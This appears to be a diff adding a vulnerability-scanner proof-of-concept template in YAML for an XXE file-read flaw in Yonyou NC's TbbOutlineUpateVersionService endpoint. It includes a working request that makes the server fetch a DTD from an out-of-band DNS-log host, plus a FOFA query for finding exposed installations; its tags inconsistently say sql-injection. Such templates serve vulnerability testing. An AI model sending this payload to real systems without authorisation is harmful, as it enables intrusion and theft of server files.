@@ -1,0 +1,19 @@
+id: poc-yaml-yongyou-nc-tbboutlineupateversionservice-xxe
+info:
+  name: 用友 NC /nc.itf.tb.outlineversion.TbbOutlineUpateVersionService 文件读取漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /uapws/service/nc.itf.tb.outlineversion.TbbOutlineUpateVersionService?xsd=http://{{.domain}}/ext.dtd
+  expression: 'reverse.Verify()
+
+    '
+transport: http
